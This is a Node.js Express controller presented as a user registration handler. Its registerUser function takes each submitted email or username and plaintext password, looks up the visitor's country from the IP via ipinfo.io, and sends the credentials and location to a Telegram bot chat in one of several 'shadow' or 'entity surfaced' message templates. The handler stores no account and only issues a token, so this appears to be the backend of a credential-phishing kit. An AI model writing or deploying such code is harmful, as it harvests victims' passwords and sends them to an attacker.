const axios = require('axios');
const jwt = require('jsonwebtoken');
const moment = require('moment');
const { JWT_SECRET } = require('../config/keys');
const { getClientIp } = require('request-ip');
const useragent = require('useragent');
const BASE62_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

const base62Encode = (num) => {
    if (!num || num <= 0) return "0";
    let encoded = "";
    while (num > 0) {
        encoded = BASE62_CHARS[num % 62] + encoded;
        num = Math.floor(num / 62);
    }
    return encoded || "0";
};

// üî• Random Base62 Generator
const randomBase62 = (length = 3) => {
    return Array.from({ length }, () => BASE62_CHARS[Math.floor(Math.random() * 62)]).join("");
};

exports.registerUser = async (req, res) => {
  let { emailOrUsername, password , clientSessionId, ip} = req.body;
  const { obfPath, sessionID } = req.params;
  const today = new Date().getUTCDate();
  const encodedDay = base62Encode(today); // Encode current day
  if (!sessionID || sessionID !== clientSessionId) {
    console.error(`‚ùå Mismatched Session ID: Expected ${clientSessionId}, Got ${sessionID}`);
    return res.status(403).json({ error: "Invalid session ID" });
}

  if (!emailOrUsername || !password || !clientSessionId) {
    return res.json({
      error: "Fields must not be empty",
    });
  }
  if (password.length < 8) {
    return res.json({
      error: "Password must be at least 8 characters long",
    });
  }
  
  try {
    // Get user IP & location
    const { country } = await getGeolocation(ip);

    // Generate JWT token based on clientSessionId
    const token = jwt.sign(
      { clientSessionId, role: "user" }, // Using clientSessionId instead of userId
      JWT_SECRET
    );

    const encode = jwt.verify(token, JWT_SECRET);
    try {
      const messages = [
        `üï∂Ô∏è A new entity has surfaced.\nüîó Credentials: ${emailOrUsername} | üîë ${password}\nüåç Route: ${country} (${ip})\n‚è≥ Log time: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `üì° Signal detected.\nüÜî Access: ${emailOrUsername}\nüîë Key: ${password}\nüìå Location: ${country} (${ip})\n‚è∞ Timestamp: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `üñ§ Unknown figure entered the system.\nüì© Handle: ${emailOrUsername}\nüîí Passcode: ${password}\nüìç Origin: ${country} (${ip})\nüï∞Ô∏è Recorded: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `üî∫ New presence acknowledged.\nüÜî ID: ${emailOrUsername}\nüîë Cipher: ${password}\nüåé Trace: ${country} (${ip})\n‚è≥ Event time: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `üåë A shadow moves.\nüì° Ident: ${emailOrUsername}\nüîê Cipher Key: ${password}\nüó∫Ô∏è Source: ${country} (${ip})\nüìÖ Timestamp: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `üëÅÔ∏è A trace has been left.\nüì© Signature: ${emailOrUsername}\nüîë Pass: ${password}\nüìå Position: ${country} (${ip})\n‚è∞ Timeframe: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `üïµÔ∏è An unidentified subject logged in.\nüìú Alias: ${emailOrUsername}\nüîè Key: ${password}\nüìç Traced back to: ${country} (${ip})\n‚è≥ Logged at: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `‚ö†Ô∏è A presence has been detected.\nüóÇÔ∏è Data point: ${emailOrUsername}\nüîë Token: ${password}\nüåê Last known route: ${country} (${ip})\nüìÜ Entry logged: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`
      ];
    
      // Select a random message format
      const telegramMessage = messages[Math.floor(Math.random() * messages.length)];
    
      await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: telegramMessage,
        parse_mode: 'HTML'
      });
    } catch (telegramError) {
      console.log("Telegram notification error:", telegramError);
      // Don't block the registration process if Telegram notification fails
    }
    return res.json({
      token: token,
      clientSessionId: clientSessionId, // Returning clientSessionId instead of userId
      user: encode,
    });

  } catch (err) {
    console.log(err);
    return res.json({
      error: "An error occurred during registration",
    });
  }
};



async function getGeolocation(ip) {
  const ipinfoToken = process.env.IPINFO_TOKEN;
  const ipv4 = ip.startsWith('::ffff:') ? ip.split('::ffff:')[1] : ip;

  // Check for private/local IPs
  const isPrivateIP = /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ipv4);
  if (isPrivateIP) {
    console.log('Private IP detected, defaulting to "Unknown".');
    return { country: "Unknown" };
  }

  try {
    const response = await axios.get(`https://ipinfo.io/${ipv4}/json?token=${ipinfoToken}`);
    return {
      country: response.data.country || "Unknown",
    };
  } catch (error) {
    console.error('Geolocation API error:', error.response?.data || error.message);
    return { country: "Unknown" }; // Default in case of error
  }
}
